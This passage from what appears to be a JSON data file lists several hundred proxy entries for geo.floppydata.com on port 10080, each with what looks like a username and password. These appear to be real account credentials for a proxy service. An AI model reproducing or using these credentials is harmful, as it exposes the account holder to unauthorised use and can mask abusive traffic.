    "geo.floppydata.com:10080:aULQrr5jLx34GTcY:J4T64jAyaCH5lpHL",
    "geo.floppydata.com:10080:vHscrHbFg4EeCwaX:d5gJFLIM6ZwWYWEX",
    "geo.floppydata.com:10080:TybqdP4KdoucbFnE:CCwovXGMunTRdA5d",
    "geo.floppydata.com:10080:YfK2KyES0kzrxNAi:O6cEOa69u5HzwnvP",
    "geo.floppydata.com:10080:LUQETSpcDmz1FBH0:zJtDXx18zS3sua0N",
    "geo.floppydata.com:10080:nUomzwDSfVgGRSpp:M6ZrMF53sRRRCsT6",
    "geo.floppydata.com:10080:gMI9XA1UhmcSaV5F:g4TCZ2z3uOHbsHgX",
    "geo.floppydata.com:10080:lxM6qxLstWFukdEN:Mherp4kPRpP5uWJh",
    "geo.floppydata.com:10080:1hp2WCjx3Euyb7rm:zHPiZa8Cdze1FoXA",
    "geo.floppydata.com:10080:xxuLLZR7dAJPiReK:D81CHflsQd03PDUz",
    "geo.floppydata.com:10080:hYwounEBplyBdvlK:sOmYSYrkDqNlcXLk",
    "geo.floppydata.com:10080:XoVZZ3lG1aQ4g2i5:rtoKmMiSIedMIfoq",
    "geo.floppydata.com:10080:2qblvXlCKVB8GzWv:ShanQwLEm2DHByDZ",
    "geo.floppydata.com:10080:PiaBTbkUf2IhoTDT:2pjZNTl8AY51MxGu",
    "geo.floppydata.com:10080:1EPrTjkqG56xsKCU:Ue77ze0xqWnso8qz",
    "geo.floppydata.com:10080:ti1YAAG9qap7jOsr:qWSazYiWxSLGjq1r",
    "geo.floppydata.com:10080:hoGpvBdDrLr3RLhr:eUsqdhs3BTdgVVbU",
    "geo.floppydata.com:10080:8EZ8G6ASOGKzoyTG:k8HR2EBaAlaHdU3Y",
    "geo.floppydata.com:10080:m4ApyIDGLbwbO3WL:l6eoaxBQ7QSZPXjJ",
    "geo.floppydata.com:10080:NqDamWahHOrNVf8X:bFRfS3P8jv2oAqHa",
    "geo.floppydata.com:10080:HalLsmxzJ0EVzS0l:MyP8mJBTjSyGtNMa",
    "geo.floppydata.com:10080:wxqPqjAXfL4T69wP:T6e9UKINzzyDn2gx",
    "geo.floppydata.com:10080:SfKOuludxrbcR4cT:mQJ111L6xX0ahTOA",
    "geo.floppydata.com:10080:IISOhsOHx2irpn7T:w95Ra1Lxsy4DTPiC",
    "geo.floppydata.com:10080:84hDNRJr6etGSPzi:WIz54jojzMn7KMkH",
    "geo.floppydata.com:10080:0MxHjOJaCM5Q2wXr:zIcGRpw83Is64zB4",
    "geo.floppydata.com:10080:oNPMpcc7Cp934IYH:ghow5ICwkhkJt3il",
    "geo.floppydata.com:10080:Mjda6NFed82GRguU:MvytzbXXIduOJ74e",
    "geo.floppydata.com:10080:UylyymsRE4pHSfoy:Sm1I5rGaA3tNJSnG",
    "geo.floppydata.com:10080:dzTZihtkFDkUJwFE:ClDZMTeGDTGyw60w",
    "geo.floppydata.com:10080:FJcpzfLo0SCfxEvT:grVAERGvRFctqy1d",
    "geo.floppydata.com:10080:hvakVFOasnQo1WVA:jzV6DgcGObHR9llj",
    "geo.floppydata.com:10080:T6IsWK1lHApD02me:xUrYgVsuGsryzV2K",
    "geo.floppydata.com:10080:NNWc2514Pts8tdBJ:djLgrQXFVNlt2aEo",
    "geo.floppydata.com:10080:a2Ur6rfjMmp0yZjG:7mvXUdOnaErgQxs5",
    "geo.floppydata.com:10080:h0X8fN497IEqx22N:5bwCY9tjp0n5UG14",
    "geo.floppydata.com:10080:hEaWdvLBiwvpqy4i:ptVZ4tTupRRZFh9t",
    "geo.floppydata.com:10080:pHIJ3zxudweaXbjO:aTFFosC1qKBNGUHF",
    "geo.floppydata.com:10080:dIwzmA0h34lwTl67:R22Yl7LBUxPM2Lcl",
    "geo.floppydata.com:10080:3wmuEdmjz9eyr8PP:yJCmYzD0N46Rx8lA",
    "geo.floppydata.com:10080:TwmVxW0ayxC11nkV:i3lJDQKwQ3hrPXAT",
    "geo.floppydata.com:10080:D12xzvIW6njNxbkW:wANMCxobcTpktJcy",
    "geo.floppydata.com:10080:i1ABuczcYNFd90np:tUXXyTSSGSMastOl",
    "geo.floppydata.com:10080:G9zVlNJMRNlfhgIG:wTYT6grYSOamDTbE",
    "geo.floppydata.com:10080:JYGkF0s8M8cVIMUV:mB5VwZaUV5jowY4X",
    "geo.floppydata.com:10080:C08yd8Wtbl7GBa7x:oxbRgJSMCp4VEmug",
    "geo.floppydata.com:10080:dufrdTxwBNZhXppO:gGDrkMM2uHmWBJj1",
    "geo.floppydata.com:10080:kgUcPKhIuJTcjAC3:Ly1SUAwBIJ9uZku1",
    "geo.floppydata.com:10080:gpCN5CwqJlLUaO3r:ijPKsgmZ7ZkAXb0E",
    "geo.floppydata.com:10080:JouVU3BFsIHXMJkb:k6v9Bmf5QqhRiKPE",
    "geo.floppydata.com:10080:vZ3DHJmj6KmaSU2l:U7Mo3tbty1DS6kyj",
    "geo.floppydata.com:10080:tz3ZIhkqgiyKsdmz:Vj5JY42J8loY2Kxy",
    "geo.floppydata.com:10080:3EGYoVGJq3DHkz3T:65ZsqlzfFkzMNaat",
    "geo.floppydata.com:10080:3n3IHqI0tRWWmAVn:G1gTCTq7lxcGgtzl",
    "geo.floppydata.com:10080:f4pbc9vz2F0TQMCv:edkqlWQywLx7BY4J",
    "geo.floppydata.com:10080:iik1guDBL7Ags2wU:GhtHdqpXm6akUm2c",
    "geo.floppydata.com:10080:IaaEQR4hGXFfQQQy:cPsgjT9jh8ndTOaC",
    "geo.floppydata.com:10080:T7NJkJYW8cKmLwyg:ICv4p3bgp12wz4n6",
    "geo.floppydata.com:10080:CZK78eelF9YOj8Xl:lJkI1lYdhRgUW6x0",
    "geo.floppydata.com:10080:WEXmdCtAk2OEKrx2:8EVzjcOFGG0GpFdJ",
    "geo.floppydata.com:10080:AoJz4RSctLivxsCm:VOdZoYsztGQ1vy3S",
    "geo.floppydata.com:10080:SKF7ej1qpCisvFIL:b2n8InGQhxDiYvdK",
    "geo.floppydata.com:10080:X8dCPjQ9109NtCd1:M2KvufuJv68IRzIL",
    "geo.floppydata.com:10080:x2Iv9nFdZGWzf0Aw:pFc2ZrginM3iSpTC",
    "geo.floppydata.com:10080:Um2dPqAx9InUMW6g:GwIc5AT5sa6xuIrB",
    "geo.floppydata.com:10080:05APsuBjrq85OVKc:5zvg5r2W0ZA5603E",
    "geo.floppydata.com:10080:MhEVL9kcFb0QVk8C:jT6q63y1Awrf2Px1",
    "geo.floppydata.com:10080:mc2nj897s2XNJvdw:sckshgz6alHZY8Jc",
    "geo.floppydata.com:10080:Fzv5WnlvwZfQLj60:9AwkPOg5KKXxxZ0L",
    "geo.floppydata.com:10080:R9x8SaZUIedC1P81:1lSMMwYpLOQZ4vwB",
    "geo.floppydata.com:10080:nVArbfheSUgwiTxX:wpFMjZ9f6iRrCY2J",
    "geo.floppydata.com:10080:FukeDYmHNiKGbzid:p8PwkeJraZ8Qwodm",
    "geo.floppydata.com:10080:sfdacWWyfKdaY1rJ:JrT7qh8CMz3vQApa",
    "geo.floppydata.com:10080:oxslj5aTjeznUEjf:Kyvo2eecHf2UP4dM",
    "geo.floppydata.com:10080:P5G6MEskeD47x6un:TSaEF89kzRwuxEal",
    "geo.floppydata.com:10080:lEczyzAKcngrRg9k:xXZotwSyzqqS5BGx",
    "geo.floppydata.com:10080:q52mYsGB097z3512:6UwvMNZ2wT1WMmmG",
    "geo.floppydata.com:10080:aXmlXvsnXls0V772:flZM2Yn9F8Rwhqw0",
    "geo.floppydata.com:10080:g5cy9Y1dy5WfodKF:qz48PKSbPeivkZ7I",
    "geo.floppydata.com:10080:9KBm1fVVh5dngVBg:z6nHBuDEXyQMLRK1",
    "geo.floppydata.com:10080:seV2qFdPhTYIKyJE:hGZPvL0kQxCY6Fd1",
    "geo.floppydata.com:10080:QN9I6Iejy5rgDk8g:wpjHOMICNaWnjJGl",
    "geo.floppydata.com:10080:oaF0xudUkBIbaLCH:TDb0wOELdQJleJHJ",
    "geo.floppydata.com:10080:O3uWLEgT6vWSJtMn:gLPwNpj7PN4pBXr6",
    "geo.floppydata.com:10080:x5BlPuKNZ1iJb2mZ:XlPawbWsu2juEaUg",
    "geo.floppydata.com:10080:mYcbyDtNBQ1HYkzX:O2BoFg5wWjOyEMMp",
    "geo.floppydata.com:10080:sHnVi3upvLgDoVIJ:tBrf0RJ4JF3ZDUjn",
    "geo.floppydata.com:10080:rp5ieDeChcbABLNW:3nFmDSp2U1xdnjOf",
    "geo.floppydata.com:10080:jHv1aRD93pFzry69:swgllxKz99e52xRZ",
    "geo.floppydata.com:10080:DT4sdG2A47hLU5oJ:DvFTOu7tj3Kl32sa",
    "geo.floppydata.com:10080:UvlNl7vmgx4H9W5G:RaACmF0IVcvy0xmE",
    "geo.floppydata.com:10080:6WIhcY7uTZ8NbNC5:NG73X8qJvAeX3uU2",
    "geo.floppydata.com:10080:QUeRnW5hwj4uOfm9:GnxQqNgLw6g2jJiV",
    "geo.floppydata.com:10080:dlaU2fp5NkvDa9yo:21xrTDGa7LwQ1Vb9",
    "geo.floppydata.com:10080:OtPXJHZ0iZzLGZR4:Cf1ZXFEx52fsgXnZ",
    "geo.floppydata.com:10080:gc37DsHo5HIkT3s8:lUiSlYqiXHIOWYsU",
    "geo.floppydata.com:10080:A9w1f3qxt2MrrQYy:VJOaBspQOj6JbQHV",
    "geo.floppydata.com:10080:Du3CgfMIsabeI6XM:ol1UgQiSWhOuk2BZ",
    "geo.floppydata.com:10080:Zb8t9lkhpCnaNMlj:Gvyv0MQkwrDTqaD8",
    "geo.floppydata.com:10080:oHWBln9yGx7B7SoU:elxLxEQq710MmkrA",
    "geo.floppydata.com:10080:UJPhtXmu64t9WFoY:yL1daAY5yyrSuGMS",
    "geo.floppydata.com:10080:mDWkToWzriEJzsei:rntj9x9PGbNvuzvH",
    "geo.floppydata.com:10080:WB202l19QhUb19sR:kctywcdpDvMh79ic",
    "geo.floppydata.com:10080:MxqRlNEh987jPMuZ:wRHb8BIvb4pDPTKG",
    "geo.floppydata.com:10080:sEZcSWWINe7LqS8z:1drsenwlCWZ9lH4a",
    "geo.floppydata.com:10080:C7gb9Pj36KmudekL:OWsgXxbSsKLszX0Q",
    "geo.floppydata.com:10080:deHJ5E3AziSEwfJn:sdpbJDMqr18OIIJL",
    "geo.floppydata.com:10080:06UwakEysHZuPUgm:bBUR3h5R9PAQYoV9",
    "geo.floppydata.com:10080:lC4EwilE1P3SNueh:fv0q8I2HE8fRz51C",
    "geo.floppydata.com:10080:yzEwl6j8aiD0OHOc:SOTbHqotIlZl3Kbt",
    "geo.floppydata.com:10080:Bh3EhVdI93yDXSGM:rjuRalafMPP8xp7Q",
    "geo.floppydata.com:10080:QkAaYktOgOQKBy89:gMC91vre4WjhtipV",
    "geo.floppydata.com:10080:T29exmxf081HJaOz:U7QWySCPd1jwBk3m",
    "geo.floppydata.com:10080:gjwjByl3wJPsUGbA:S4Mo1yEW8CD9nGKB",
    "geo.floppydata.com:10080:P0T1jYQpWZA1aGYq:t6tmR6ohD9xFZHvX",
    "geo.floppydata.com:10080:gZfn9bWtUO7wsfnP:QHc7QTTySoHfHpsC",
    "geo.floppydata.com:10080:FDOSCGdrKy2dYQra:0Up9y9IlOPgQJRFM",
    "geo.floppydata.com:10080:WWg7mpGlEBcU0oiu:rQhBxtKu8e8MgyQD",
    "geo.floppydata.com:10080:rN676ztHtlQ2wzeb:id5bg4LBlIuyv6b3",
    "geo.floppydata.com:10080:nfpZ4NhIMPN6iSCP:0zxgPxVtM2sP7o8I",
    "geo.floppydata.com:10080:qh0PCdGbW8jYy1t0:mJfTBYCddP5HznCO",
    "geo.floppydata.com:10080:yVrPld9Fj6OOzqEE:h9eVaS2HSG8BRbMT",
    "geo.floppydata.com:10080:36NJE26KmBivgzHF:PlYb5W6HkeHHN8oq",
    "geo.floppydata.com:10080:uqXmoi0BW9T0fygK:OBRMQzrwNOdTUn9r",
    "geo.floppydata.com:10080:hTbriHqm2EpBDYUT:o4LLtoPZLS2fvq5g",
    "geo.floppydata.com:10080:TlHyRJDVPM9WFQsg:rj702e9WB9TdlTMF",
    "geo.floppydata.com:10080:t5P9m3KdRbCTbatP:HwrgClFKbymOYuEj",
    "geo.floppydata.com:10080:iCeSfNp7qf8jLIYS:oTfTudlScvuNWuFs",
    "geo.floppydata.com:10080:5KAtEmhjsooUGjlV:zuWkH81cqh7bLiIj",
    "geo.floppydata.com:10080:jBX6NwLw5HksLsH5:slyIEy8eMLnAKaf4",
    "geo.floppydata.com:10080:ZHnhNVegte11LNGK:vQXBnvUJWeW6miYf",
    "geo.floppydata.com:10080:CHyiRP70EAY3JigK:WWBcNlV8o4yeI1wl",
    "geo.floppydata.com:10080:I0FzHhNcMitffs3u:NTv8ztpvKvlaDXjW",
    "geo.floppydata.com:10080:8sEr2j6KACPWXZh7:29VkqG94tynGxeH5",
    "geo.floppydata.com:10080:FRN4rmJO1GRaMPGZ:yT9YJHOXKoRTQpPh",
    "geo.floppydata.com:10080:11ApaoW0UeM9Tdi8:l6WKi3OtMqWVdDBW",
    "geo.floppydata.com:10080:CdKiSxBBMXnGWrWe:AaX4x2nOfglVdbnu",
    "geo.floppydata.com:10080:p0ni0jPnMIOOArJ2:IUenme9qOFBYSInR",
    "geo.floppydata.com:10080:S7zo04F5KH0er2d8:fHEGkZoKUs7PW1hF",
    "geo.floppydata.com:10080:rj8BfV2Pzk53BWBE:I1Ng5aIznwwyF0d3",
    "geo.floppydata.com:10080:rGbmMf59n0z9pxLH:ThzkYD7nRNtx7jyd",
    "geo.floppydata.com:10080:RXeFOQGJAgLDibY4:A4k6UTZQUJm0tTBq",
    "geo.floppydata.com:10080:OJs9Qx1IbkfEwnoe:MtMuB5Z19sTtBX9f",
    "geo.floppydata.com:10080:clNLvNLptmg7a0Qc:SPeosQ10R9pk8y7n",
    "geo.floppydata.com:10080:jtQT4HuHRsebV7NB:alMBTKVZJtI6k6YA",
    "geo.floppydata.com:10080:CocKVqnyhwYnImIC:NAjLdEZ9GVjqFmJu",
    "geo.floppydata.com:10080:cpUONgoiSYiTTQPV:YyzXcW0BlLEvOvW1",
    "geo.floppydata.com:10080:WILS1txkLwTWvsDp:Ve1PWPsPx5yJhO1e",
    "geo.floppydata.com:10080:ZN0hTqdFVdDc6bxb:CccmE13fNSoXoQKs",
    "geo.floppydata.com:10080:gf1GCTexfihVhkOF:HY0gsiC5W0HW1Ub9",
    "geo.floppydata.com:10080:m8AbrdRexzrkQhDd:k08xrNgtb3Vw9B1O",
    "geo.floppydata.com:10080:lYNNk0xST3uNe7WL:Flnc4vHtGU6b1MCt",
    "geo.floppydata.com:10080:5q2yYS4hckZ8uY5a:YJmphCNXTyF2TyXV",
    "geo.floppydata.com:10080:a8EMHxOWdkJa9yxL:wxkcazNGfzq5FnYK",
    "geo.floppydata.com:10080:DMXAlxbjQI701hYI:I8xtVYdRqFQ9w2No",
    "geo.floppydata.com:10080:rIxeonyZyhQ7NcTa:yqxPBawge2Alo4g6",
    "geo.floppydata.com:10080:2XaikKJE4IFIcyhw:uoISp3RdF8js4poP",
    "geo.floppydata.com:10080:bZESPAOimuqLrV15:Q3H6JvLZmOrI2i5A",
    "geo.floppydata.com:10080:8rOZhgOmg86LDU5p:T7UWbzYzLh1hDhM2",
    "geo.floppydata.com:10080:a2IVNH4YwUizC6pk:ON9EFei5jvFHZ16R",
    "geo.floppydata.com:10080:3uhpxaGngY5jyyJb:mMhyQny5bhHSfYPg",
    "geo.floppydata.com:10080:q8y8IfrM5o0hCZ78:7dddGUPePVnYeoW6",
    "geo.floppydata.com:10080:kMeZkuzu51RIBhnO:EIJYgx7MOKUt7oht",
    "geo.floppydata.com:10080:IkMz0HkQbdzNHdOu:rqMDX5FpPXbxPZJW",
    "geo.floppydata.com:10080:sAhkyp1PG2Y9LNp1:xeNfyI3TKgGdRkQ1",
    "geo.floppydata.com:10080:h7lHCKwtpaEiciAi:eC8NpTKKoWvkIorJ",
    "geo.floppydata.com:10080:gvhGtdctqUx3m2Aa:2SJ7IpPYML3BTVf5",
    "geo.floppydata.com:10080:XIcrkpIpSKmd8Bs5:gj2h7jN45VJQvEaf",
    "geo.floppydata.com:10080:vLw4AprDjLFcqoWo:J3rKm3llgCzREE2G",
    "geo.floppydata.com:10080:UHldRayDqQKae9fi:r0f4NytdmT6YTQGv",
    "geo.floppydata.com:10080:1NtzkBaUK4O0If5M:EcByf78So5qHvWFy",
    "geo.floppydata.com:10080:jiapPXH27d5mRxUx:cWZciuaq9EsPZYIa",
    "geo.floppydata.com:10080:UYTD0t1uZyiYnBSB:LV7KeKjlmx9MMVbq",
    "geo.floppydata.com:10080:VbvyktkDfRGFC1XW:qHxwnAffZbuBuh3l",
    "geo.floppydata.com:10080:RO5nlbVvD7LqocMm:8BgdXsOiEHy0qmPa",
    "geo.floppydata.com:10080:09vr70WJA0WR5LkK:811zkB85kP8ziszN",
    "geo.floppydata.com:10080:3gGF7eSRo72WTBeM:5KN6xgwX6pHEYzNb",
    "geo.floppydata.com:10080:9JFvzRiQzy78uGRx:SvrBnAsxG36pJV4W",
    "geo.floppydata.com:10080:Lili8ItlQEIqUIia:lTvlnPTp8NC7da5k",
    "geo.floppydata.com:10080:JOLKVTYjo2sEiR3e:QZvL7Z5TxanxB9GW",
    "geo.floppydata.com:10080:gNKnMy77APaCfEaQ:q7LICxYkkAmgYuEL",
    "geo.floppydata.com:10080:grnrrvVbqwznc5P4:WPh0JxR8qQM4QKIj",
    "geo.floppydata.com:10080:4oCZn2pDhzOSenQm:WztAhY9aAFYbeduR",
    "geo.floppydata.com:10080:JWITuHIFZochaf4a:qKJkDBGS2VzdgCHJ",
    "geo.floppydata.com:10080:UBxARti8ClRPW6se:cwn3xk7qikrexhCI",
    "geo.floppydata.com:10080:6DAaYqwj7X9HMYb9:P8YAqREuCvzv5cGh",
    "geo.floppydata.com:10080:Pe3V12mSkoAoiO2v:UYsMHT9R5mIT89o5",
    "geo.floppydata.com:10080:ibxiGXRe75ZLAXZB:wmAxfKxzRiSSnWfJ",
    "geo.floppydata.com:10080:qp9QTr7q5i6JfQBp:9nDJjMGckm6EFL3j",
    "geo.floppydata.com:10080:WPbEt069nkQA3IzS:WgonD19TrB47pfwh",
    "geo.floppydata.com:10080:AMwB7gijZvbu74E1:b839nD0AvY9Oxlol",
    "geo.floppydata.com:10080:DazlRQPO25bA1dhA:9svI7aZMZEaBeKBc",
    "geo.floppydata.com:10080:X5HaC4ZEvGNCntSr:4CuhlqVT3q7wBwYt",
    "geo.floppydata.com:10080:jeWyKpAle4kJcy1k:bhRHLjni5MfBq165",
    "geo.floppydata.com:10080:7G44JKneqyraAsgY:7Bg7CCfiw2IRRhTQ",
    "geo.floppydata.com:10080:xaJfUiTHS90LQtTp:3adpl3SglXCyTctN",
    "geo.floppydata.com:10080:P6Wl6d4HnaOy027e:zmYp6yGEAj8EbRc5",
    "geo.floppydata.com:10080:3zyvu8a0RaC7sAKj:rq8fOPxPyx9SY3aM",
    "geo.floppydata.com:10080:gFeLCOBgJJHRcLZv:A7FjtFyjQDPvybrc",
    "geo.floppydata.com:10080:df51r5Zy1sT92pBH:KOKDmqQUlxFt227O",
    "geo.floppydata.com:10080:QXUAhKViz8e3YCge:IOrohibp2POt7i1o",
    "geo.floppydata.com:10080:oK4RqFZgHbTFghER:9B0d0CyUdUy2QW4j",
    "geo.floppydata.com:10080:6pOoSBCG1f1mStjN:ec8zU0hGVcsTBD11",
    "geo.floppydata.com:10080:dx6VSLo9tuq4ig2B:t2waVCwveSj8dCo9",
    "geo.floppydata.com:10080:wIz87VfYcjoXuxD4:I6BIy6HCtAyIkSqT",
    "geo.floppydata.com:10080:EjKEFGAwj7EIcGVH:JpwlUDU50uEX2Lfi",
    "geo.floppydata.com:10080:UADaMkg7zXXLAD1O:l7gqRBiU8lsmFO1d",
    "geo.floppydata.com:10080:j2R3O9rTHJXmYFY2:eyqNI8gMOsV01Htk",
    "geo.floppydata.com:10080:Dr6SobjxcxGATCeM:7LORVgN4RX10y037",
    "geo.floppydata.com:10080:aOALtIrnP5gGvxUu:JoNzMPnHqTPgi2bm",
    "geo.floppydata.com:10080:PC4CUQ4lJO22XUb6:Ik4vdqI3F4mHru0z",
    "geo.floppydata.com:10080:dh66btweGZATdD6t:9oxMHt8RuYLChDj1",
    "geo.floppydata.com:10080:vADRmltmx82A0F2Z:qKTOcnPMLlX2gM2O",
    "geo.floppydata.com:10080:JcPGB1ySqFZfQAAB:2Z6kRsGZvz2iRUzd",
    "geo.floppydata.com:10080:e7zuEMLq65PFxz2A:5ZJVgQc8X3AsAxEv",
    "geo.floppydata.com:10080:FB6j1cFc8vK6Neec:OoHZB6NofNoocSfa",
    "geo.floppydata.com:10080:G7b2zr3uqz2IqKxU:8eK55evDUiWs4YKZ",
    "geo.floppydata.com:10080:qfMRt9Lh8zBwpFjM:EOeRt5yRf13yEXrl",
    "geo.floppydata.com:10080:9e3wuwND4pZggxFM:YEB34viyjBwTkkXI",
    "geo.floppydata.com:10080:RwxYZwDSJujX52Hy:soUuYRrxDXOHerH7",
    "geo.floppydata.com:10080:A7wLYk2FOliLYrAh:6hDybjuDZSVgWp4F",
    "geo.floppydata.com:10080:LkhLJ8bA4zdxdLFj:PrMlL45HiDBVlJNu",
    "geo.floppydata.com:10080:oVQyyM9PQEp3C8Y8:WiX7TOSMu1jEFLG8",
    "geo.floppydata.com:10080:3JMI1b2l5GH9Fg0d:kNns8yy4rq2sdCXy",
    "geo.floppydata.com:10080:i4cYmaoXeXiJSljz:wsoHkPeDIQjvjZ0N",
    "geo.floppydata.com:10080:4n1IcayTzpPzU2CE:v85gkyxoHRAWry6F",
    "geo.floppydata.com:10080:5SnaQLD1acrcgX82:IEfyTpSQa5Bs54Gd",
    "geo.floppydata.com:10080:MJvY22j09Y0LRHBC:bm8o1lCxUfS8XpJ1",
    "geo.floppydata.com:10080:NfqMKXItCRHB5Th9:2CrTuzCdZX304Myf",
    "geo.floppydata.com:10080:59tWTN3xOHhoji68:yWdYgfrsWYywGooS",
    "geo.floppydata.com:10080:wWBDyw2PjIpfjjRZ:jMlS7ToTAh7D28xT",
    "geo.floppydata.com:10080:5PTSpkIqoX0VmFna:8HhmFhjb20iAylzF",
    "geo.floppydata.com:10080:ePB3rxoRbzvTH79Y:WahJaj36o59lPqVj",
    "geo.floppydata.com:10080:PmWv3hlM88uIaI03:QBsc5EBvXG9cqa0h",
    "geo.floppydata.com:10080:daWWv2KN7FhACJwQ:AA5X41CBNRxJptv1",
    "geo.floppydata.com:10080:9mCt4lkg45u167fa:JVujBArrvXATO5Qn",
    "geo.floppydata.com:10080:cmLpeIWKaTL6cHlP:TIcmI6n2iDUKkG8i",
    "geo.floppydata.com:10080:yRZYuVeWaYkESLYp:rmhUHY6KPTSM3aIh",
    "geo.floppydata.com:10080:5GjMkzrs2Y6s9iRH:1d4wLOuF851rmJ25",
    "geo.floppydata.com:10080:iRHLRAsqcj9VD9GC:jbNpZI7HHeUYo3jK",
    "geo.floppydata.com:10080:anQm6Ftssgcudkzp:1jJQk9Nnh2zEwsBG",
    "geo.floppydata.com:10080:XGRaRzWnsgrpFLT7:99KpjyfEVL5uPfBo",
    "geo.floppydata.com:10080:SfBSrjOBCEkg3ry3:j2ufkdMW67B3TyhP",
    "geo.floppydata.com:10080:gx1AgjgEOZcvlXHH:LLulKue1K3Ds0mCc",
    "geo.floppydata.com:10080:1o1G4YKeWzIHqf1h:90TnVsMkzl0Syayr",
    "geo.floppydata.com:10080:XgHSTK7I5jHUCLdz:w8YyLkfqZ0MmatCu",
    "geo.floppydata.com:10080:Xn9sM8gAyQPNb029:O9qhZTGZJuPYlSe9",
    "geo.floppydata.com:10080:XettMTXyoeRkYUtk:8WlbNIa3JHo2UXIO",
    "geo.floppydata.com:10080:ENEia6N19QvjCxIA:royrgHevL6WGnSS6",
    "geo.floppydata.com:10080:Ovc2JB74cMmVDYk7:qy1Rs083MW3fKfWN",
    "geo.floppydata.com:10080:B3rpV2i4PMHUbhfJ:ecs4MIRq2j61VFpJ",
    "geo.floppydata.com:10080:g2SlW5pHNa1Xn7ne:H4qHRp72nHvKU1JG",
    "geo.floppydata.com:10080:bXUzsL7TDE00yl6p:785PcTrbr3nS4feO",
    "geo.floppydata.com:10080:QQTRdRy99S0eBcpq:UMGix8QFe0HA77MW",
    "geo.floppydata.com:10080:UoNChMshp1IH4tdI:1hphGKAwRHx5TmH1",
    "geo.floppydata.com:10080:0TGPCDhbWYE7QNRE:ABnhcXIMej8DPzwR",
    "geo.floppydata.com:10080:xFcRnWc6NKMazIqe:CqtTNlWzeJvPsBZu",
    "geo.floppydata.com:10080:l47ewnca56mDlEN5:kJe9BaIQcuHB8W2m",
    "geo.floppydata.com:10080:KRbYXSxC6e0yVsWO:Fd3VFC0XPuLI8MlG",
    "geo.floppydata.com:10080:VpjglIuXj6xmQhru:4dBbDfxRpkeElqWy",
    "geo.floppydata.com:10080:rjESCDJLlz3nVbdX:EbxhgWCLh0OLbgzn",
    "geo.floppydata.com:10080:TscmLhy7iQdhNMAk:xwKYDsvMVmAInF73",
    "geo.floppydata.com:10080:QXT4JDzYXN1Zi4Wp:ZegnmjSrOsD1pks5",
    "geo.floppydata.com:10080:U4jrRcihl1HuIK4f:z6XcMw2NODplc11i",
    "geo.floppydata.com:10080:X2yjf3KXEf4gfcdo:mioyW2oUwlnYLKgC",
    "geo.floppydata.com:10080:FoJ04RMsgfVt12vI:3tE615eQ48okcxgW",
    "geo.floppydata.com:10080:7fwacWabYsmYICAK:itc4QtoNCll1wxxk",
    "geo.floppydata.com:10080:pQZ0hn9jwf6r6nlJ:pslAKumrp936ocyK",
    "geo.floppydata.com:10080:obLAJLQxxiwxzMdJ:c2KqRf04fkDGLnqx",
    "geo.floppydata.com:10080:pZQUpluI0cQqsD37:YgUcDQlwcCuin4Vi",
    "geo.floppydata.com:10080:xSHaefp0NmykMnZ3:W1TTapYDEGSVwMhH",
    "geo.floppydata.com:10080:aMlUbYxbH01zpYCt:4WAbqW6NDkPStVnb",
    "geo.floppydata.com:10080:WV7u9fwyP2Uhq9tV:HQtteOwX5GjMEvXt",
    "geo.floppydata.com:10080:rfgWhcmRV0n66ABV:9HMENSrKbPdZCVnF",
    "geo.floppydata.com:10080:AbGfrnBh7zlFfmIJ:shsO6mjrTHDoTxYQ",
    "geo.floppydata.com:10080:eJFXFDSlw8IETHsj:lYyUJ1PC7kokQOx6",
    "geo.floppydata.com:10080:aG7wgQwfAhAtC6jT:q3LKiDNs1HXkLSDa",
    "geo.floppydata.com:10080:7wERDW9NOvBqReSj:AKPhI4AjbLhKFv4t",
    "geo.floppydata.com:10080:dYFVZjza5XtVzZZ2:U4M7mw2YsDEGLGed",
    "geo.floppydata.com:10080:VPTJWy8YirDe8PnX:V3UCGkRxoKsPWgVY",
    "geo.floppydata.com:10080:BhWU21DeeS0YOxAb:gSyv43yb7dkgV1LK",
    "geo.floppydata.com:10080:l9nBcgmUWKpG4kuM:DnzEWRDqcxn8HynJ",
    "geo.floppydata.com:10080:c75o8GewLRfjUkzI:f2ENybpnensScCoU",
    "geo.floppydata.com:10080:rzjCgJiivZTNEFZe:ddEyhRiEj0nJ935g",
    "geo.floppydata.com:10080:5YwiS3jDKZ4OiARv:o927vtWCtoMItYK4",
    "geo.floppydata.com:10080:jtCQcMSHAiZQRv7M:H70NfuyUaEqAz77C",
    "geo.floppydata.com:10080:geUc6btxiMKoyQMo:2C0JWXnNaPWr1QFr",
    "geo.floppydata.com:10080:Acw3YYmDKpesfwLW:EQPUN2CVcJMCUG5O",
    "geo.floppydata.com:10080:uD2LMpKvD2SGrXJ2:ixXOjAsesP028j3U",
    "geo.floppydata.com:10080:cQCLIc2PKhNLjl7E:KtaZEEawG36YuHRF",
    "geo.floppydata.com:10080:JesBCds63vzr3MWs:QASjzgF7wvGDJnyp",
    "geo.floppydata.com:10080:2ogsAiD0AFvWr0fo:rQ3gbYQb17IAGoS1",
    "geo.floppydata.com:10080:7UIlCLzDOaGrZQ4l:6pDf9iKHAJ8gXTKW",
    "geo.floppydata.com:10080:aibd7XfER0No75cM:82DrFf31byE1FghY",
    "geo.floppydata.com:10080:LhwWxwv1YMetk9r5:TWYlTmeCdfVe2hmd",
    "geo.floppydata.com:10080:NO151fzh0jbmVz9D:IUH5QFfmuu3qcDRi",
    "geo.floppydata.com:10080:uooCbWMa33i2y27P:XzsyKCs1auM2Li2d",
    "geo.floppydata.com:10080:1KRgFklcxiyX6EOu:7kTdyJokVxrAXhza",
    "geo.floppydata.com:10080:gdEAv3KECEKPVfLp:LLix3g9roTpboXEW",
    "geo.floppydata.com:10080:K9gpOfweY3xkph5r:H9uk3uxHXat9t47K",
    "geo.floppydata.com:10080:v3cq4pFv301wtDXx:DLb7Wud91U3jcGoC",
    "geo.floppydata.com:10080:zEdCx6MUwVmCZO1G:AzIoBmBsahvQpDBi",
    "geo.floppydata.com:10080:Qgzg6NCy6C1DkHYf:H2AMgAaWUbnnJMzC",
    "geo.floppydata.com:10080:Hep4D1CByrbgsfDT:jZGrRfVPBIDZzSIy",
    "geo.floppydata.com:10080:OVNEd45s4cj9LYKM:5bstNoslN8SAe4RQ",
    "geo.floppydata.com:10080:Sy1EZ3CQ9qf5I1YZ:C34gdPKocithzR5F",
    "geo.floppydata.com:10080:yk5OVmVpqfDIJ6Vk:qPCFxV4MF80tSdlo",
    "geo.floppydata.com:10080:5Z36qJC6FwhJsWwK:JGiEeqjhFlw13pDn",
    "geo.floppydata.com:10080:csMZhKw8o0V2IEky:q8BRvws4rcuTPyui",
    "geo.floppydata.com:10080:6oa6w9NsMqu8Uiwg:oJqygw3vqfpsIhCZ",
